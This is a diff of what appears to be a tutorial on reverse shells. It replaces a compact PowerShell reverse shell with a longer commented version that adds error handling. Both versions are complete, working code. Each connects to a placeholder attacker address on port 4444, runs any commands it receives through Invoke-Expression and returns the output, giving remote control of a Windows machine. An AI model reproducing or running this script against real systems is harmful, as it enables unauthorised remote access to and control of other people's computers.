@@ -27,27 +27,68 @@ This command tells `netcat` to listen on port 4444 for incoming connections.
 A simple PowerShell reverse shell script can be written as follows:
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.AutoFlush = $true
-$buffer = New-Object System.Byte[] 1024
-$encoding = New-Object System.Text.AsciiEncoding
+# Define the IP address and port of the Raspberry Pi (attacker)
+$attackerIP = "ATTACKER IP" #typically etho0
+$port = 4444
 
-while ($true) {
-    $writer.Write("PS " + (Get-Location).Path + "> ")
-    $read = $stream.Read($buffer, 0, $buffer.Length)
-    $cmd = ($encoding.GetString($buffer, 0, $read)).Trim()
-    try {
-        $result = (Invoke-Expression $cmd 2>&1 | Out-String )
+try {
+    # Create a new TCP client and connect to the attacker
+    $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $port)
+    if (-not $client.Connected) {
+        throw "Could not establish a connection to $attackerIP on port $port."
     }
-    catch {
-        $result  = $_.Exception.Message
+
+    # Get the network stream
+    $stream = $client.GetStream()
+    if (-not $stream) {
+        throw "Failed to get the network stream."
     }
-    $writer.WriteLine($result)
-    $writer.Flush()
+
+    # Initialize stream writer and reader
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true
+    $buffer = New-Object System.Byte[] 1024
+    $encoding = New-Object System.Text.AsciiEncoding
+
+    while ($true) {
+        try {
+            # Send the current directory path as a prompt
+            $writer.Write("PS " + (Get-Location).Path + "> ")
+
+            # Read the command from the attacker
+            $read = $stream.Read($buffer, 0, $buffer.Length)
+            if ($read -le 0) {
+                throw "Failed to read from the network stream."
+            }
+            $cmd = ($encoding.GetString($buffer, 0, $read)).Trim()
+
+            # Execute the received command
+            try {
+                $result = (Invoke-Expression $cmd 2>&1 | Out-String)
+            }
+            catch {
+                $result = $_.Exception.Message
+            }
+
+            # Send the result back to the attacker
+            $writer.WriteLine($result)
+            $writer.Flush()
+        }
+        catch {
+            Write-Error "Error processing command: $_"
+            break
+        }
+    }
 }
-$client.Close()
+catch {
+    Write-Error "Critical error: $_"
+}
+finally {
+    if ($client -and $client.Connected) {
+        $client.Close()
+    }
+}
+
 ```
 
 ### Explanation of the PowerShell Script
